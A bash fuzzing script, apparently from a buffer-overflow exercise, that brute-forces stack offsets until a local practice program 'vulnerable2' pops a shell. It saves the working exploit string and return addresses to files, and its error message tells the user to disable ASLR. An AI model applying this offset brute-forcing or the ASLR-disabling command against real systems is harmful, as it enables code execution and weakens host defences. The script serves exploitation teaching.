#/bin/bash
#
# fuzzer2.sh
# This is a tool that generates exploitation strings and tries to exploit the
# vulnarable program. Note, that fuzzer2.sh must reside in the same directory
# where generator2 and vulnerable2 programs are located.
#
# Usage:
# 1. cd ./build
# 2. ./fuzzer2.sh 600 <up|down>
# ==> fuzzing should eventually end popping up the shell
# 3. follow the instructions from the output how to properly exit the shell
# 4. payload2.txt file at this moment contains the working exploitation string
#    and egg.txt file contains the series of return addresses to the $EGG in
#    vulnerable2 program's stack
# 5. check it with:
#    export RET=`cat payload2.txt` EGG=`cat egg.txt`
#    ./vulnerable2 $RET
# Note, that environment variables block is also placed on the stack, and the
#    fuzzing process was performed with $EGG set to some value, so to repeat
#    the overflow successfully, the environment block must have the same size
#    as it had during fuzzing.
# Note also, that this time we use negative offset from our stack pointer,
#    because environment block is layed out in the bottom of the stack or the
#    top of the memory.
#

if [ "$EGG" = "" ]; then
    # check for ASLR
    aslr=`cat /proc/sys/kernel/randomize_va_space`
    if [ "$aslr" != "0" ]; then
        printf "Cannot proceed, ASLR is enabled. please run %s first\n" \
            "\"echo 0 > /proc/sys/kernel/randomize_va_space\""
        exit 1
    fi

    # prepare essentials
    buffersize=600 # default
    offset=0 # default
    offset_step=4 # consider 4-byte stack alignment, default is down the stack
    if [ "$#" -gt 0 ]; then
        number='^[0-9]+$'
        if ! [[ $1 =~ $number ]]; then
            printf "Error: invalid parameter\n"
            exit 1
        fi
        buffersize=$1
    fi
    if [ "$#" -gt 1 ]; then
        if [ "$2" = "up" ]; then
            offset_step=-$offset_step # scanning the stack in upward direction
        fi
    fi
    it=0
    exitflag="/tmp/terminate2"
    rm -f $exitflag

    # generate
    while [ ! -f $exitflag ]; do
        printf "Try: %s, buffersize: %s, offset: %s, " \
            $it $buffersize $offset
        printf "on success exit shell with: \"touch %s && exit\"\n" \
            $exitflag
        ./generator2 $buffersize $offset
        if [ "$?" -ne "0" ]; then
            printf "Error: invalid generator parameters\n"
            exit 1
        fi
        offset=$(($offset+$offset_step))
        it=$(($it+1))
    done
else
    # exploit
    echo $EGG > egg.txt
    echo $RET > payload2.txt
    ./vulnerable2 $RET
    exit 0
fi

